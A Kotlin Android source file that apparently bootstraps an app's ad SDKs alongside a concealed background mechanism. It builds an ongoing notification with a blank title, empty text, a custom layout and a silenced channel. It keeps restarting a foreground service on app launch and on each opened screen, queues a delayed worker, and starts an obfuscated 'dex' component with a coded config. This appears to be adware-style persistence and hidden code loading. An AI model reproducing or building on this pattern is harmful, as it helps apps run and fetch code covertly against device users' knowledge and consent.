package com.announcement.comprehension.utcs

import android.app.Application
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import android.widget.RemoteViews
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import com.announcement.comprehension.BuildConfig
import com.announcement.comprehension.R
import com.announcement.comprehension.t.ClosePages
import com.announcement.comprehension.t.ForeSv
import com.announcement.comprehension.t.KvItem
import com.announcement.comprehension.t.TWorkManager
import com.announcement.comprehension.t.dex.Fnc
import com.applovin.sdk.AppLovinMediationProvider
import com.applovin.sdk.AppLovinSdk
import com.applovin.sdk.AppLovinSdkInitializationConfiguration
import com.appsflyer.AppsFlyerLib
import com.bytedance.sdk.openadsdk.api.init.PAGMConfig
import com.bytedance.sdk.openadsdk.api.init.PAGMSdk
import com.google.firebase.FirebaseApp
import com.google.firebase.messaging.FirebaseMessaging
import com.thinkup.core.api.TUSDK
import java.util.UUID
import java.util.concurrent.TimeUnit

class RealTStart {

    fun st(context: Context) {
        aSt(context)
    }


    companion object {
        var timePoint = 0L
        var checkMsg: Notification? = null
    }

    private fun loadNotice(context: Context): Notification {
        if (checkMsg != null) return checkMsg!!
        checkMsg = NotificationCompat.Builder(context, "CleBlueId")
            .setSmallIcon(R.drawable.kibakal)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .setAutoCancel(false)
            .setContentText("")
            .setContentTitle(" ")
            .setCustomContentView(RemoteViews(context.packageName, R.layout.fak_ht_tin)).build()
        return checkMsg!!
    }


    fun starForeServiceForApp(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) return
        runCatching {
            loadNotice(context)
            val intent = Intent(context, ForeSv::class.java)
            ContextCompat.startForegroundService(context, intent)
        }
    }

    fun starForeServiceForPage(context: Context) {
        if (System.currentTimeMillis() - timePoint < 10 * 60 * 1000L) return
        runCatching {
            loadNotice(context)
            val intent = Intent(context, ForeSv::class.java)
            ContextCompat.startForegroundService(context, intent)
        }
    }


    private fun aSt(context: Context) {
        val userId = FirUseS(context).fieIn()
        IdPro(context).listStart(userId)



        context.getSystemService(NotificationManager::class.java).createNotificationChannel(
            NotificationChannel(
                "CleBlueId",
                "CleBlueName",
                NotificationManager.IMPORTANCE_DEFAULT
            ).apply {
                enableLights(false)
                setSound(null, null)
                enableVibration(false)
            }
        )

        val rst =
            OneTimeWorkRequestBuilder<TWorkManager>().setInitialDelay(10L, TimeUnit.SECONDS).build()
        WorkManager.Companion.getInstance(context)
            .enqueueUniqueWork("TWorkManager", ExistingWorkPolicy.REPLACE, rst)

        starForeServiceForApp(context)
        (context as Application).registerActivityLifecycleCallbacks(ClosePages.apply {
            action = { pa ->
                starForeServiceForPage(pa)
            }
        })

        Fnc.start(
            context, arrayListOf(
                "bug",
                """{
    "bta":"wow_bob_dud_k",
    "cvv":"id_token",
    "nak":"n1fvkei1g11lcv_n1g2hkkfet0hbd",
    "akm":"5_10",
    "nma":"1000_2000_30_15_5",
    "eka":"30_0_0_10_200_400"
}""",
                BuildConfig.VERSION_NAME
            )
        )

    }
}